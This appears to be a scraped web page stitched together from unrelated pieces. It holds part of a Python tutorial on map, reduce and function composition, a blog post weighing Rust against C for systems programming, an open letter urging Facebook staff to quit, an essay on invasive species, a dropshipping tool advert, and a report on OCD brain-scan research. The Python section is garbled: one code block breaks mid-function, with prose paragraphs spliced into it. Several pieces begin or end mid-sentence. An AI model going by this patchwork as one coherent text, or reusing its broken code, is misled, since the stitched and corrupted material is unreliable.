<p>When we are processing a list of items, it is extremely easy to use the functions that we’ve defined
above to process the list using a <code>map</code>.</p>

<p>On Python, the call would look something like this:</p>

<div><div><pre><code><span>x</span> <span>=</span> <span>items</span>
<span>x</span> <span>=</span> <span>map</span><span>(</span><span>my_function_one</span><span>,</span> <span>x</span><span>)</span>
<span>x</span> <span>=</span> <span>map</span><span>(</span><span>another_call</span><span>,</span> <span>x</span><span>)</span>
<span>x</span> <span>=</span> <span>map</span><span>(</span><span>third_call</span><span>,</span> <span>x</span><span>)</span>
<span>x</span> <span>=</span> <span>map</span><span>(</span><span>calculate</span><span>,</span> <span>x</span><span>)</span>
</code></pre></div></div>

<h2 id="reduce-it">Reduce it</h2>

<p>What if we want to get a single value as a result? Functional programming toolset has 
this function called <a href="https://docs.python.org/3/library/functools.html#functools.reduce">reduce</a>:</p>

<div><div><pre><code><span>from</span> <span>functools</span> <span>import</span> <span>reduce</span>

<span>#...
</span><span>x</span> <span>=</span> <span>map</span><span>(</span><span>calculate</span><span>,</span> <span>x</span><span>)</span>
<span>x</span> <span>=</span> <span>reduce</span><span>(</span><span>lambda</span> <span>c</span><span>,</span> <span>i</span><span>:</span> <span>c</span> <span>+</span> <span>i</span><span>,</span> <span>x</span><span>)</span>
</code></pre></div></div>

<p>Actually, <code>reduce(lambda c, i: c + i, x)</code> is the same as
<code>reduce(operators.add, x)</code>. It is also equivalent to <code>sum(x)</code> on Python,
so the same above could be expressed as:</p>

<div><div><pre><code><span>#...
</span><span>x</span> <span>=</span> <span>map</span><span>(</span><span>calculate</span><span>,</span> <span>x</span><span>)</span>
<span>x</span> <span>=</span> <span>sum</span><span>(</span><span>x</span><span>)</span>
</code></pre></div></div>

<p>It is important to note here, that <code>lambda c, i: c + i</code> is a function
and could be replaced with anything. For example, calculating is not
that difficult either (but there are better ways):</p>

<div><div><pre><code><span>def</span> <span>accumulate</span><span>(</span><span>cumulative</span><span>,</span> <span>current_item</span><span>):</span>
    <span>count</span><span>,</span> <span>sum</span> <span>=</span> <span>cumulative</span>
    <span>return</span> <span>count</span> <span>+</span> <span>1</span><span>,</span> <span>sum</span> <span>+</span> <span>current_item</span>

<span>#...
</span><span>x</span> <span>=</span> <span>map</span><span>(</span><span>calculate</span><span>,</span> <span>x</span><span>)</span>
<span>x</span> <span>=</span> <span>reduce</span><span>(</span><span>accumulate</span><span>,</span> <span>x</span><span>,</span> <span>initial</span><span>=</span><span>(</span><span>0</span><span>,</span> <span>0</span><span>))</span>
<span>average</span> <span>=</span> <span>x</span><span>[</span><span>1</span><span>]</span> <span>/</span> <span>x</span><span>[</span><span>0</span><span>]</span>
</code></pre></div></div>

<h2 id="composing-functions">Composing functions</h2>
<p>I’ve just used (introduced?) an extremely important concept in FP -  function composition. It deserves
a special mention.</p>

<p>In the part <code>reduce(accumulate, ...)</code> you can see that we are calling a function, that takes another
function as the argument. To be used inside <code>reduce</code> the <code>accumulate</code> function has to satisfy 
the same signature requirements (if such a thing exists in Python at all…) - it takes two arguments
and returns a single value. The first argument and the return value should be (preferably) of the same 
type.</p>

<p>Then, when the time comes, <code>reduce</code> will call our supplied function to accumulate the stream of values
into a single value (it will get <em>reduced</em>). 
For developers who know their <a href="https://en.wikipedia.org/wiki/Object-oriented_programming">OOP</a>, 
it is the same as a <a href="https://en.wikipedia.org/wiki/Strategy_pattern">Strategy pattern</a>.</p>

<p>We can use the same idea in our functions as well. For example, let’s say we are writing a 
function to normalize some input data, but we want to let our users choose if the text
should be processed uppercased or lowercased. We could implement that like this:</p>

<div><div><pre><code><span>def</span> <span>noop</span><span>(</span><span>text</span><span>):</span> <span># default function that does nothing
</span>    <span>return</span> <span>text</span>

<span>def</span> <span>clean_text</span><span>(</span><span>text</span><span>,</span> <span>text_processor</span><span>=</span><span>noop</span><span>):</span>
    <span>text</span> <span>=</span> <span>text</span><span>[:</span><span>10</span><span>]</span>
    <span>text</span> <span>=</span> <span>text_processor</span><span>(</span><span>text</span><span>)</span>
    <span>return</span> <span>text</span>

<span>first_use</span> <span>=</span> <span>clean_text</span><span>(</span><span>"aaAA"</span><span>,</span> <span>str</span><span>.</span><span>upper</span><span>)</span>
<span>second_use</span> <span>=</span> <span>clean_text</span><span>(</span><span>"aaAA"</span><span>,</span> <span>str</span><span>.</span><span>lower</span><span>)</span>
<span>third_use</span> <span>=</span> <span>clean_text</span><span>(</span><span>"aaAA"</span><span>)</span>
</code></pre></div></div>
<h3 id="factory-functions">Factory functions</h3>

<p>The version of the <code>clean_text</code> above can be unwieldy to use with <code>map</code> so it is often beneficial
to create a factory function, that creates the version of <code>clean_text</code> that has only a single
argument but you still get to choose which text processing function to use:</p>

<div><div><pre><code>
<span>def</span> <span>clean_text</span><span>(</span><span>text_processor</span><span>=</span><span>noop</span><span>):</span>
    <span>def</span> <span>step</span><span>(</span><span>text</span><span>):</span>
        <span>text</span> <span>=</span> <span>text</span><span>[:</span><span>10</span><span>]</span>
        <span>text</span> <span>=</span> <span>text_processor</span><span>(</span><span>text</span><span>)</span>
        <span>return</span> <span>text</span>
    <span>return</span> <span>step</span>

<span>items</span> <span>=</span> <span>map</span><span>(</span><span>clean_text</span><span>(</span><span>str</span><span>.</span><span>lower</span><span>),</span> <span>items</span><span>)</span>
</code></pre></div></div>

<p>This is also a perfect way to create configurable functions.</p>

<h3 id="better-composition-examples">Better composition examples</h3>
<p>In the example above, we could move the text_processor to the pipeline itself:</p>

<div><div><pre><code><span>def</span> <span>clean_text</span><span>(</span><span>text</span><span>):</span>
    <span>text</span> <span>=</span> <span>text</span><span>[:</span><span>10</span><span>]</span>
    <span>return</span> <span>text</span>

<span>items</span> <span>=</span> <span>map</span><span>(</span><span>clean_text</span><span>,</span> <span>items</span><span>)</span>
<span>items</span> <span>=</span> <span>map</span><span>(</span><span>str</span><span>.</span><span>lower</span><span>,</span> <span>items</span><span>)</span>
</code></pre></div></div>

<p>so a better example would be a randomizing post-processing function, to augment 
text examples for your neural network. We will make this augment function configurable,
so the users of the function can choose the possible augmentations:</p>

<div><div><pre><code><span>import</span> <span>random</span>

<span>def</span> <span>clean_text</span><span>(</span><span>text</span><span>):</span>
    <span>text</span> <span>=</span> <span>text</span><span>[:</span><span>10</span><span>]</span>
    <span>return</span> <span>text</span>

<span>def</span> <span>augment</span><span>(</span><span>augmentations</span><span>):</span>
    <span>def</span> <span>step</span><span>(</span><span>text</span><span>):</span>
        <span>augmentation</span> <span>=</span> <span>random</span><span>.</span><span>choice</span><span>(</span><span>augmentations</span><span>)</span>
        <span>return</span> <span>augmentation</span><span>(</span><span>text</span><span>)</span>
    <span>return</span> <span>step</span>

<span>items</span> <span>=</span> <span>map</span><span>(</span><span>clean_text</span><span>,</span> <span>items</span><span>)</span>
<span>items</span> <span>=</span> <span>map</span><span>(</span><span>augment</span><span>([</span><span>noop</span><span>,</span> <span>str</span><span>.</span><span>lower</span><span>,</span> <span>str</span><span>.</span><span>upper</span><span>]),</span> <span>items</span><span>)</span>
</code></pre></div></div>



<p>Often, I get to see functions that look something like this:</p>

<div><div><pre><code>
<span>def</span> <span>some_big_function</span><span>(</span><span>x</span><span>,</span> <span>z</span><span>):</span>

<p>while the specific example above is not that bad because it is rather clear 
what’s happening just because it is ~10 lines long, I am not happy when I find
code like this.</p>

<p>This big function can be deconstructed in a few smaller functions (let’s pretend
that this code is 100 lines long) and those functions can then become a part
of the pipeline.</p>

    <span>return</span> <span>e</span> <span>==</span> <span>"a"</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1598813964607/cahJGXdrf.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>That's a pretty daring question considering Rust has been around for a fairly short amount of time and in that time has become the most loved language for 5 years in a row, according to the Stack Overflow <a target="_blank" href="https://insights.stackoverflow.com/survey/2020#technology-most-loved-dreaded-and-wanted-languages-loved">Developer Surveys</a>.</p>
<p>It is very clear that developers love working with Rust, many big companies have been adopting it to fix many of the memory issues C and C++ have caused by taking advantage of Rust's memory safety capabilities. Microsoft recently started rewriting <a target="_blank" href="https://msrc-blog.microsoft.com/2019/11/07/using-rust-in-windows/">core components</a> of Windows in Rust and the folks in charge of Linux have been talking about integrating Rust to the <a target="_blank" href="https://lore.kernel.org/lkml/CAKwvOdmuYc8rW_H4aQG4DsJzho=F+djd68fp7mzmBp3-wY--Uw@mail.gmail.com/T/">kernel</a>. That's a big step for Rust.</p>
<p>But the question remains... should we trust Rust with the future of systems programming?</p>

<p>As much as it costs to admit, Rust is still a young language compared to C, which has been around for over 48 years and still is the preferred language for <strong>systems programming</strong>, every major operating system in the world is written in C/C++, as well as their drivers, utilities and built-in software.</p>
<p>But is Rust up to the challenge? Many developers have been rewriting software written in C with Rust, demonstrating that it is not only capable of competing with it but also of generating faster, more reliable software by taking advantage of Rust's modern features.</p>
<p>Here's a small <a target="_blank" href="https://zaiste.net/posts/shell-commands-rust/">list</a> of projects to check out:</p>
<ol>
<li><a target="_blank" href="https://zaiste.net/posts/shell-commands-rust/#bat">bat</a> -&gt; is a <code>cat</code> clone with syntax highlighting.</li>
<li><a target="_blank" href="https://zaiste.net/posts/shell-commands-rust/#exa">exa</a> -&gt;  is a modern replacement for <code>ls</code>.</li>
<li><a target="_blank" href="https://zaiste.net/posts/shell-commands-rust/#starship">starship</a> -&gt; is a minimal, blazing-fast, and infinitely customizable prompt for any shell.</li>
<li><a target="_blank" href="https://zaiste.net/posts/shell-commands-rust/#ripgrep">ripgrep</a> -&gt; is an extremely fast alternative to <code>grep</code></li>
</ol>

<p>While having programs rewritten in Rust is pretty cool, being able to write low-level components is a must-have for a language that intends to become #1 for systems programming, things such as the kernel and drivers. There are no immediate plans to rewrite current operating systems in Rust, but there is a project created by <a target="_blank" href="https://twitter.com/jeremy_soller">Jeremy Soller</a>, System76 Principal Engineer called <a target="_blank" href="https://www.redox-os.org/">RedoxOS</a>.</p>
<blockquote>
<p>Redox is a Unix-like Operating System written in Rust, aiming to bring the innovations of Rust to a modern microkernel and full set of applications.</p>
</blockquote>
<p>Redox aims to demonstrate Rust's systems programming capabilities to a full extent, having written not only the kernel in Rust but also every piece of software that it ships with it. One of those is <a target="_blank" href="https://gitlab.redox-os.org/redox-os/relibc/-/blob/master/README.md">relibc</a>, a portable POSIX C standard library compatible with Redox and Linux. Redox isn't currently going to replace your existing OS, but it's a fun thing to try.</p>
<p>Rust still has a long way to go before it can compete with a language like C, but the future is looking very promising.</p>

<p>While Rust has come a long way but it still lacks many of the features that C/C++ programmers take for granted, just to name a few:</p>
<p><strong>Compile-time code/type generation and verification</strong> -&gt; Rust does have a procedural macro system that can be used to accomplish these things but it's not remotely the same.</p>
<p><strong>Static Analysis</strong> -&gt; There may be more tools available for C++ but the quality of the static analysis built right into Rust's type system blows all of them away, no tool can reliably prevent dangling references or data races in C++. As far as only using safe Rust, static analysis is in a way better shape than C++ because it has nothing as powerful as the borrow checker.</p>
<p><strong>Sanitizers</strong> -&gt; Due to the type system, safe Rust code has much less need for sanitizers, when it comes to unsafe code, C++ has the advantage as it has more tools available.</p>
<p>There's also safe transmutation (safely cast “plain old data” types to and from raw bytes), safe support for C style unions, and fallible allocation (fail gracefully from allocation failure, rather than panic) as stated by Microsoft.</p>

<p>As many missing features Rust has, its safe to say that, in time, Rust may become the language of choice for systems programming. Rust has an amazing community of developers that work hard every day to bring new features to the language, especially now that Microsoft supports Rust into becoming a better and more useful language. </p>
<blockquote>
<p>We at Microsoft will be able to help in these endeavors to shape the future of the language to improve its usefulness [...]. </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>I <a href="https://www.linkedin.com/posts/jasonmcintosh_facebooks-kenosha-guard-militia-event-was-activity-6705852062460084224-G5e9">posted the following note to my LinkedIn page</a> earlier today, where I also <a href="https://daringfireball.net/linked/2020/08/29/facebook-kenosha-guard-455-times">linked to this Daring Fireball article</a>.</em></p>

<p>A note to my friends who still work at Facebook:</p>

<p>You are at the top of your career. The very fact of your job at Facebook demonstrates a level of technical acumen that would allow you to work anywhere you wish within the technology sector.</p>

<p>The time has come for you to take advantage of this. Your employer has become unworthy of your talent. Please quit. Work for a company doing literally anything else.</p>

<p>From promoting hateful conspiracy theories to favoring Trump’s re-election, <a href="https://fogknife.com/2019-05-23-i-read-ruined-by-design.html">Facebook’s drive for emotionally fueled “engagement” over all else</a> steals the light from our shared human future in order to enrich a handful of people.</p>

<p>I know that you do not identify as a white supremacist. Facebook, however, funnels most of your talent directly into growing and empowering white supremacy’s most significant technological ally in spreading hate.</p>

<p>I urge you to think of your own career prospects, as well. The peak of Facebook’s positive reputation already lay in the past. After this year, employers will justifiably assume that hiring someone from Facebook would risk bringing in a culture of division, deception, and algorithmically optimized racism.</p>

<p>Please, for your own sake, if not for the sake of the future: leave Facebook. Do it today, before it ruins you.</p>

		<p><em>So far I’ve only written about human systems and the unintended consequences that arise from them. But the “natural world” is complex also. We are just beginning to understand the interconnections of living and non-living things. Environmental ecosystems can also be pushed in one direction or another by human intervention and other activity. That means plenty of second-order effects.&nbsp;</em></p>
<p>Ecosystems are often complex beyond our ability to appreciate them, but on the surface they can seem simple. Maybe this is why there have been so many attempts to alter ecosystems by adding to them or subtracting from them. The impact of those additions or subtractions can tough to know in advance, but the impact can be estimated and controlled. Beyond intentionally changing an ecosystem, there are also all of the non-human changes that occur.</p>
<p><span id="more-344"></span>There’s a blurry line between invasive or introduced species and native or indigenous species. To be counted as invasive or introduced, there needs to be human intervention — a distinction without a difference if the result ends up the same. Species move around the world on their own all the time (wind, sea, on or in the bodies of their hosts). Then there are gray areas, such as species that navigate to new environments by floating on plastic in the ocean. They can hitch a ride on floating material that is only there because of human activity, but it wasn’t humans who brought the species to any specific place.</p>

<p>While it might seem odd today to intentionally introduce and spread species from other parts of the world, <strong>in the 1800s, this interventionist&nbsp;<a href="https://archive.org/stream/cihm_22920#page/n7/mode/2up">attitude</a> was <a href="https://timesmachine.nytimes.com/timesmachine/1877/11/15/80669466.pdf">common</a>&nbsp;in <a href="https://en.wikipedia.org/wiki/Acclimatisation_society">acclimatization societies</a></strong>.</p>
<p>From a “<a href="https://archive.org/stream/acclimatisation00unkngoog#page/n8/mode/2up">Lecture on Acclimatisation</a>” in Australia: The societies were about “the acclimatisation or art of introducing the mammalia, birds, fishes, and insects into countries to which they are foreign, utilising them in places where they were formerly unknown, and in such congenial localities as may conduce to their being reared and propagated with success — thus reducing our scientific knowledge to useful and practical purposes.”</p>
<p>Two factors encouraged this work. First there were food shocks felt around the world, including for example the effects of the potato blight in Ireland. One ideas supporting species introduction was to lower the risk of dependence on only local foods.</p>
<p>The other factor encouraged — or at least that didn’t stop — these societies is the lack of understanding of the risks they were creating.&nbsp;It was apparently rare in these societies to debate the impact species introduction might have on local ecosystems and how to introduce species in a controlled manner.</p>
<p>Here are ways that ecosystems change by the addition or subtraction of just one species.</p>

<p><strong><em>Intentional introduction for food.&nbsp;</em></strong><em>Rabbits in Australia.&nbsp;</em>Feral pigs in the Americas.</p>
<p>Introduced as a food source in the 1800s, rabbits have caused ecological damage by multiplying so quickly that the food they ate depleted plant life and led to soil erosion.&nbsp;Rabbits in Australia are an example of just how fast things can change when a small number of fast reproducing, fast-moving, versatile animals are introduced into a suitable environment.</p>
<p>Rabbits can bread only in Spring and Summer in Europe, but year round in much of Australia. They were a good candidate to cause environmental&nbsp;<a href="https://unintendedconsequenc.es/anything-at-scale/">scaling effects</a>&nbsp;in Australia. And they did. Rabbits are the fastest reproducing mammal in the world.</p>
<p>Multiple efforts to eradicate or control them, from germ warfare to a fence spanning the western part of Australia, have been unsuccessful.</p>
<p>Pigs were introduced into the Americas multiple <a href="https://books.google.com/books?id=rh0LmDWdEI4C&amp;printsec=frontcover&amp;dq=Wild+Pigs+in+the+United+States&amp;hl=en&amp;sa=X&amp;ei=VOF2Uc-sBsXH4APJwoGgAw&amp;ved=0CC8Q6AEwAA#v=onepage&amp;q&amp;f=false">times</a>. First by Columbus, who brought eight pigs on his voyage to Cuba in 1493. Then by Hernando de Soto who brought 13 pigs to Florida in 1539. Apparently, by 1542 that pig herd grew to 700, not including those that escaped. Hernando Cortez brought pigs to New Mexico in 1600. Sir Walter Raleigh brought pigs to Jamestown in 1607. Pigs were even introduced from Europe as late as the 1930s. In some <a href="https://unintendedconsequenc.es/the-cobra-effect-redesigned/">locations</a>, the <a href="https://unintendedconsequenc.es/the-cobra-effect-redesigned/">wild pigs</a> are a nuisance with repeated attempts to eradicate or control their populations. So far, control has not worked. <a href="https://www.smithsonianmag.com/science-nature/a-plague-of-pigs-in-texas-73769069/">Feral pig</a> populations can <a href="https://www.aphis.usda.gov/aphis/ourfocus/wildlifedamage/operational-activities/feral-swine/sa-fs-history">expand quickly</a>, even with efforts at control. Generalist eaters suited for many different environments and too big for most predators, they are mostly considered a nuisance today.</p>
<p><strong><em>Intentional introduction to combat another species. </em></strong><em>Cane toads in Australia.</em></p>
<p><a href="https://www.nationalgeographic.com/animals/amphibians/c/cane-toad/">Cane toads</a> are native to Latin America but were introduced to Australia to combat a beetle that ate sugar cane roots. The Australian sugar cane plantations were themselves a new experiment. And the cane toads never did eat many of those beetles.</p>
<p>Native species in Australia, “unaware” that cane toads are also poisonous, die <a href="https://en.wikipedia.org/wiki/Argus_monitor">trying</a> to <a href="https://en.wikipedia.org/wiki/Northern_quoll">eat</a> them. Predators seem to be learning though. Some birds learned to attack the toads’ underbelly and avoid the poison glands on its back, while some snakes with <a href="http://www.pnas.org/content/101/49/17150">smaller jaws</a> (which don’t enable them to eat the large cane toad) succeeded in reproducing and passing on that trait.</p>
<p>Efforts at cane toad control include&nbsp;<a href="https://www.canetoadsinoz.com/">training</a> potential predators like water monitors, quolls, and bluetongue lizards to avoid the cane toads by administering manageable amounts of toad, which convinces the would-be predators to stay away.</p>
<p>There was <a href="https://theconversation.com/everyone-agreed-cane-toads-would-be-a-winner-for-australia-19881">broad approval</a> in the 1930s of the plan to introduce this species to Australia.</p>
<p><strong><em>Intentional introduction as art.&nbsp;</em></strong><em>Starlings in the US.</em></p>
<p>It’s not every day that we can blame the Bard of Avon and his fans for an unintended consequence. But Eugene Schieffelin “hoped to introduce into North America <a href="https://www.nytimes.com/1990/09/01/opinion/100-years-of-the-starling.html?src=pm">every bird</a> mentioned by Shakespeare.” He imported starlings from England and released them in Manhattan in 1890 and 1891. <a href="https://www.nytimes.com/1990/09/01/opinion/100-years-of-the-starling.html?src=pm">Starlings</a> soon started to drive native birds out of their habitats, ate massive amounts of crops, and spread disease. By the 1940s, starlings had reached California. They now number in the hundreds of millions.</p>
<p>If you’re wondering, Shakespeare only mentioned starlings in&nbsp;Henry IV Part I. A list of all the other birds is <a href="http://www.shakespeare-online.com/faq/birdsshakespeare.html">here</a>.</p>
<p><em><strong>Accidental introduction.</strong>&nbsp;The brown tree snake in Guam and other islands in the South Pacific.</em></p>
<p>The <a href="https://en.wikipedia.org/wiki/Brown_tree_snake">brown tree snake</a>, native to Australia and parts of Southeast Asia, was accidentally introduced into Guam. The theories are that the snakes hitched a ride on ships or aircraft landing gear after WWII. Guam was an easy location for the snakes to colonize quickly since the island didn’t have natural predators for them. What followed was the local or total extinction of many bird species, including the <a href="https://en.wikipedia.org/wiki/Guam_flycatcher">Guam Flycatcher</a>.</p>
<p>Guam, as a transportation hub, became the staging ground for the brown tree snake’s entrance to many other environments which suited it. The attempt to kill off the brown tree snake population starting in <a href="https://www.rawstory.com/2010/10/navy-airdrops-dead-drugged-mice/">2010</a> (60 years after its introduction) was to drop mice stuffed with Tylenol (poisonous to the snakes) in trees where the snakes would eat them. This kill technique’s&nbsp;design seems well targeted at brown tree snakes (well, we’ll see). As one of the few snakes that will also scavenge for food (and will therefore eat the poisoned dead mice), the program has a chance. I can’t find much detail related to how well the program has reduced the brown tree snake population. We’ll see.</p>
<p><strong><em>Intentional reintroduction of “native species” that went extinct.&nbsp;</em></strong><em>Beavers in UK.</em></p>
<p>Beavers went extinct in UK in the 1600s. A few years ago they were <a href="https://www.researchgate.net/publication/286869238_Reintroducing_the_European_Beaver_in_Britain">reintroduced</a> into Scotland and England for reasons including flood control and beavers’ encouragement of greater species diversity in places they inhabit.&nbsp;When beavers were reintroduced, people revolted. But&nbsp;these releases have apparently been controlled and studied in the small scale and it looks like the reintroduction has (so far) been beneficial. Again, we’ll see.</p>
<p><span>The estimate is that there are </span><a href="http://digitalcommons.unl.edu/cgi/viewcontent.cgi?article=1037&amp;context=nwrcinvasive">50,000 introduced species</a><span> in the US (out of 750,000 species present here).&nbsp;The examples above are just a handful of the more noticeable ones. </span></p>

<p>Years ago someone told me a story about a big media company. They had to rip up part of the floor in one of their offices to make repairs and discovered a tangled mass of communications cables snaking underneath. What did they do? Replace and reconnect the cables? No. When they saw that tangled mass, they touched nothing down there and carefully replaced the floorboards. Who knows where each cable led and what content it carried? Better just to leave things as they were.</p>
<p>In a complicated system, unless you understand how your change make things better, better just to leave things as is.</p>
<p>And if you want to read about a system falling apart in something as predictable as a pocket watch, see <a href="http://www.pocketwatchrepair.com/histories/twain2.html">Mark Twain</a>.</p>

        </p>

        <!-- step 1  -->
        <div>
          <p><span>Step 1</span>
          </p>
          <div>
            <p><span>Automated Product Research</span></p><p>AMZ Snagger was birthed from the perspective of an amazon dropshipper. After months of grinding it out, putting in 100hr weeks looking for winning products and being able to scale into a 6 figure store. We knew that product research was an issue and it needed to be simplified.</p>
            <p>No one believed it could be done but we always did. So we got to work and designed YOU a bot from the mind of an amazon dropshipper.</p>
            <p>We designed a proprietary algorithm that mines, scrapes, sorts and filters winning products for you on autopilot. So that you can focus on the other important aspects of your business.</p>
            <p>Now we want you to experience what we experienced: The redemption of our time!</p>
          </div>

        <div>
          
          <div>
            <p><span>Sort Through Qualified Products</span></p><p>We designed the app to filter and weed out the diamonds in the rough. This has virtually never been done before, since we ourselves our dropshippers we knew exactly What the amazon dropshipping community wanted to experience.</p>
            <p> Sorting Options like: price, category, sellers on listings, buyBox Eligibility and the potential for profit</p>
            <p>The most exciting part of this all, is that you are able to download all of the Winning products that are profitable and export them as a CSV.</p>

The approach known as <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fajp.psychiatryonline.org%2Fdoi%2Fabs%2F10.1176%2Fappi.ajp.2020.19080886&amp;t=MjA0NjY2ZWQ4YTI1NGVhNTIxODUwMWVlZWI0ZTg5NzdkMjc2ZGU0MSxnOWo3RE1BWQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627900402450497536%2Fpersonalized-ocd-treatment&amp;m=0&amp;ts=1599049769">‘exposure therapy’, a form of cognitive behavioral therapy, or CBT, was more effective and reduced symptoms more as time went on, compared with stress-management therapy</a>, also known as SMT.</p><p>But when the researchers looked back at the brain scans taken before the patients began therapy, and linked them to individual treatment response, they found striking patterns.</p><p>The brain scans were taken while patients performed a simple cognitive task and responded to a small monetary reward if they did the task correctly.</p><p>Those who started out with more activation in brain circuits for processing cognitive demands and reward during the tests were more likely to respond to CBT – but those who started out with less activation in those same areas during the same tests were more likely to respond well to SMT.</p><p>“We found that the more OCD-specific form of therapy, the one based on exposure to the focus of obsession and compulsion, was better for relieving symptoms, which in itself is a valuable finding from this head-to-head randomized comparison of two treatment options,” says <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmedicine.umich.edu%2Fdept%2Fpsychiatry%2Fstephan-taylor-md&amp;t=OGYyZTA4MDhhZDY0YjI1ZTU0YTE5OWJhMWUyNDQyZTBkZmM4MTQ3ZixnOWo3RE1BWQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627900402450497536%2Fpersonalized-ocd-treatment&amp;m=0&amp;ts=1599049769">Stephan Taylor, M.D.</a>, the study’s senior author and a professor of psychiatry at Michigan Medicine, U-M’s academic medical center. “But when we looked at the brain to see what was behind that response, we found that the more strength patients had in certain brain areas were linked to a greater chance of responding to exposure-based CBT.”</p><h2><b>Key brain regions involved in studying OCD</b></h2><p>The brain regions and circuits that had the strongest links to treatment have already been identified as important to OCD – and have even been targets for treatment with an emerging therapy called transcranial magnetic stimulation.</p><p>Specifically, stronger activity in the circuit called the cinguloopercular network during the cognitive task, and stronger activity in the orbitostriato-thalamic network when the reward was at stake, was associated with better response to exposure-based CBT. But lower activity in both regions was associated with better response to the stress-reduction SMT. The effects didn’t vary across age groups.</p><p>“These findings speak to a mechanism for therapy’s effects, because the brain regions associated with those effects overlap substantially with those implicated previously in this disorder,” says Luke Norman, Ph.D., who led the work as a U-M neuroscience postdoctoral fellow and is now a scientist at the National Institutes of Health. “This suggests we need to draw upon the most-affected networks during therapy itself, but further research is needed to confirm.”</p><p>The brain scans were done while patients underwent a test that required them to correctly pick the correct letter out of a display, and offered a potential monetary reward if they performed the task correctly. This measured both their ability to exert control over their cognitive processes in picking out the right letter, and the extent to which the promise of a reward motivated them.</p><figure data-orig-width="850" data-orig-height="478"><img src="https://64.media.tumblr.com/f606c03e13777957afd9b7ca52f1da45/ce424dd158826732-61/s1280x1920/c861a16fef139b4cd7b17f72683ee3a830e74f38.jpg" alt="image" data-orig-width="850" data-orig-height="478" width="850" height="478"></figure><p><i>Image:&nbsp;The colorful brain regions show where differences in activation were associated with differences in OCD treatment response.

Past research has already linked it to OCD and treatment response in general, and it’s thought to play a key role in self-regulation of response to OCD triggers. Previously, the U-M team had shown that in general, <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Flabblog.uofmhealth.org%2Flab-report%2Fstuck-a-loop-of-wrongness-brain-study-shows-roots-of-ocd&amp;t=M2YzMWM2NzU3ODcyOGRkZjNlMDMyNjQ5ZTlmOTZmYzQwZDIzNzlhNixnOWo3RE1BWQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627900402450497536%2Fpersonalized-ocd-treatment&amp;m=0&amp;ts=1599049769">people with OCD tend to have reduced activation in the rACC</a> when asked to perform tasks that involve cognitive control.</p><p>Among those who responded best to CBT, the researchers saw stronger pre-treatment activation in areas of the brain associated with learning how to extinguish fear-based responses to something that has caused fear in the past. Because exposure therapy for OCD involves facing the thing or situation that provokes obsessive and fearful responses, having a stronger ability to be motivated by rewards might help someone stick with therapy despite having to face their triggers.</p><h2><b>Personalizing OCD treatment</b></h2><p>The findings suggest a path to personalizing the choice of therapy not by doing brain scans on everyone with OCD – which would be impractical – but by using everyday tests that measure the kinds of characteristics that might predict better success with one therapy or the other.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.uofmhealth.org%2Fprofile%2F576%2Fkate-dimond-fitzgerald-md&amp;t=MWE0MzdhNmU5ZDg1ODA1MWY5MDE0YmIzZDQxODgwMzA1NjE5ODk0NixnOWo3RE1BWQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627900402450497536%2Fpersonalized-ocd-treatment&amp;m=0&amp;ts=1599049769">Kate Fitzgerald, M.D.</a>, a pediatric OCD specialist at Michigan Medicine who is co-senior author of the paper and leads multiple studies of OCD therapy for children and adolescents, explains that easily administered behavioral tests could be developed to help therapists recommend CBT to those who have the most cognitive control and reward responsiveness, and SMT to those who would benefit most from being taught to relax and use problem-solving techniques to improve their response to stressors.</p><p>But computer-based brain-training exercises that can strengthen these tendencies, and rewards for exposing oneself to the thing or action that triggers OCD symptoms, may hold the potential to improve therapy response, she says.</p><p>“This kind of research may help inform efforts to do cognitive control training and ramp up the circuits that help patients overcome conflict between obsessive fears and insight that these fears don’t make sense so that patients can dismiss the fear as improbable, rather than trying to make it go away with compulsive behaviors,” she says. “Our research shows that different brains respond to different treatments, and if we can build on this knowledge we could move toward a more precision-medicine approach for OCD.”</p><p>In children and teens, whose brains are still maturing, there’s an especially good chance of helping them improve their brains’ control functions.</p><h2><b>New research to advance OCD understanding</b></h2><p>Fitzgerald and her team are currently recruiting <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fclinicaltrials.gov%2Fct2%2Fshow%2FNCT03584945%3Frecrs%3Dab%26cond%3Dobsessive%2Bcompulsive%2Bdisorder%26age%3D0%26draw%3D2%26rank%3D7&amp;t=Nzg3ZWU5MDE2NmRhMDA0NzZlOTBjNTE1MzFkNDFlNGY2MTlkYjc5ZCxnOWo3RE1BWQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627900402450497536%2Fpersonalized-ocd-treatment&amp;m=0&amp;ts=1599049769">young people with diagnosed OCD, and OCD-like tendencies, for a clinical trial that provides CBT</a> and includes brain scanning before and after therapy.</p><p>Since OCD symptoms typically start in the tween years, though diagnosis may not occur until the teen or young adult years, it’s important to study children with sub-clinical symptoms, she notes.</p><p>Though the study involves in-person interactions for the brain scans, the CBT exposure therapy is done through video chat. In fact, Fitzgerald says, this can make it easier for children and teens to confront the item or situation that triggers their OCD-like impulses, because these are often found in the home environment.</p><p>“We need families and patients to engage with researchers in studies like these,” says Fitzgerald. “Only through research can we understand what works best for different groups of patients. And perhaps by doing so we can expand the availability of the most evidence-based OCD therapies – including by engaging psychologists and clinical social workers in leading treatment programs, in addition to psychiatrists at specialized centers.”</p><p>–</p><p><b>Source: <a 